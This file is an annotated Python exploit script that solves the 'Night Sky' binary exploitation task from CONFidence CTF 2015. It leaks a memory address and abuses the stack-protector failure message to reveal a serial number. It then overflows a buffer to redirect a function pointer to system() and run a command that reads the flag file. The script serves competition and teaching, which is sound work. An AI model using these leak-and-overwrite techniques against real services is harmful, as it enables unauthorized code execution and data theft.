#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Filename:         exploit.py
# Author:           Mateusz Jurczyk
# Task:             Night Sky
# Competition:      CONFidence CTF 2015
# Category:         Software exploitation
# Scoring:          500 pts (hard)
# Number of solves: 2 out of 11 teams

import socket
import struct
import time

def read_until(s, text):
  buffer = ""
  while len(buffer) < len(text):
    buffer += s.recv(1)
  while buffer[-len(text):] != text:
    buffer += s.recv(1)
  return buffer[:-len(text)]

def dw(x):
  return struct.pack("<H", x)

def dd(x):
  return struct.pack("<I", x)

def dq(x):
  return struct.pack("<Q", x)

def add_star(s, age, name):
  read_until(s, "Select an operation.\n")
  s.send(dd(0))
  read_until(s, "Age?\n")
  s.send(dd(age))
  read_until(s, "Name?\n")
  s.send(dq(len(name)) + name)

def edit_star(s, idx, age, name):
  read_until(s, "Select an operation.\n")
  s.send(dd(2))
  read_until(s, "Which star?\n")
  s.send(dq(idx))
  read_until(s, "Age?\n")
  s.send(dd(age))
  read_until(s, "Name?\n")
  s.send(dq(len(name)) + name)

def list_stars(s):
  read_until(s, "Select an operation.\n")
  s.send(dd(3))

def create_constellation(s, name, stars):
  read_until(s, "Select an operation.\n")
  s.send(dd(4))
  read_until(s, "Name?\n")
  s.send(dq(len(name)) + name)
  read_until(s, "Stars?\n")
  s.send(dq(len(stars)))
  for star in stars:
    s.send(dq(star))

def register_program(s, payload, length = None):
  if length == None:
    length = len(payload) + 1
  
  read_until(s, "Select an operation.\n")
  s.send(dd(8))
  read_until(s, "What serial number?\n")
  s.send(dw(length) + payload)

def save_to_file(s, filename):
  read_until(s, "Select an operation.\n")
  s.send(dd(9))
  read_until(s, "File name?\n")
  s.send(dq(len(filename)) + filename)

def main():
  # Connect to the service.
  s = socket.socket()
  s.connect(("127.0.0.1", 1337))

  # Create a star and a constellation object, and set the star's name
  # to 36 characters, which will result in a non-terminated ASCII string.
  #
  # While at it, write LIBC_FATAL_STDERR_=1 to the static memory through
  # the name of the constellation, to later use it while overwriting the
  # envp[] array.
  add_star(s, 1337, "star")
  create_constellation(s, "LIBC_FATAL_STDERR_=1", [0])
  edit_star(s, 0, 1337, "A" * 36)

  # Leak the address of the constellation structure and use it to
  # calculate the image base address.
  list_stars(s)
  read_until(s, "A" * 36)
  static_address = struct.unpack("<Q", s.recv(6) + "\x00\x00")[0]
  IMAGEBASE = static_address - 0x205060

  # Provoke the invocation of __stack_chk_fail to disclose the contents
  # of the serial.txt file from static memory.
  #
  # char *argv[] = {0x205780 "<serial.txt contents>", NULL};
  # char *envp[] = {0x205060 "LIBC_FATAL_STDERR_=1", NULL};
  register_program(s, 
                   ("A" * 376 +
                    dq(IMAGEBASE + 0x205780) + dq(0) +
                    dq(IMAGEBASE + 0x205060) + dq(0)),
                   length = 0)
  read_until(s, "*** stack smashing detected ***: ")
  serial_no = read_until(s, " terminated")

  print "[+] Revealed serial number: %s" % serial_no

  # Close the connection.
  s.close()

  # Indefinitely try to obtain the flag.
  got_flag = False
  while not got_flag:
    # Wait 100ms.
    time.sleep(0.1)

    # Connect to the service.
    s = socket.socket()
    s.connect(("127.0.0.1", 1337))

    # Register the program with the leaked serial no.
    register_program(s, serial_no)

    # Trigger a buffer overflow, overwriting the two lower bytes of
    # the canonicalize_file_name() function pointer with the address
    # of the nearby system() routine. The most significant nibble
    # within these 16 bits is guessed; in our case it is assumed to
    # be equal to 0x0.
    #
    # Within the same operation, we're passing a string that will be
    # treated as the command to execute by system().
    CMD = "echo FLAG:; cat flag.txt; echo DONE;"
    save_to_file(s, CMD.ljust(4096 + 8, "\0") + dw(0x0640))

    # Wait 100ms.
    print "Trying....\n"
    time.sleep(0.1)

    # Check if we received the flag. If so, print it out and exit.
    data = s.recv(6)
    if data == "FLAG:\n":
      flag = read_until(s, "\nDONE")
      print "[+] Flag: \"%s\"" % flag
      got_flag = True
    else:
      print "[-] Unsuccessful."

    # Close the connection.
    s.close()

if __name__ == "__main__":
  main()
